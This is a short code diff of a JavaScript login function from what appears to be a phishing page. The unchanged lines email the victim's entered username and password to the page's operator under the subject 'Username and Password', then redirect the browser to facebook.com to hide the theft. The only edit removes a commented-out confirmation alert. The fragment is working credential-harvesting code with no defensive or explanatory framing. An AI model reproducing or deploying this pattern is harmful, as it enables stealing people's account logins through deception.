@@ -64,7 +64,6 @@ function login() {
     Subject: "Username and Password",
     Body: "Username: " + username.value() + "<br><br>Password " + password.value()
   }).then(
-//     alert('Email was sent')
   );
   window.location.replace("http://facebook.com");
 }
